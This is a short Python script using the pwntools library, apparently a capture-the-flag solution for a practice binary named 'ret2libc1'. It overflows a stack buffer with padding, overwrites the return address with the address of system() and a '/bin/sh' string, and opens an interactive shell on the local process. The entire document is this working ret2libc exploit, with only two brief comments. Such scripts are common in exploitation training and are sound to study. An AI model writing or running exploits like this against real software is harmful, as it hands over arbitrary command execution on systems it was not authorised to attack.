#!/usr/bin/python3
from pwn import *

system_addr = 0x08048460
bin_sh_addr = 0x08048720
offset = 0x6c + 4

payload = b'A' * offset
payload += p32(system_addr)
payload += p32(0xcccccccc)  # This is typically a placeholder for the return address
payload += p32(bin_sh_addr)

sh = process('./ret2libc1')  # Make sure the binary name is correct
sh.sendline(payload)
sh.interactive()
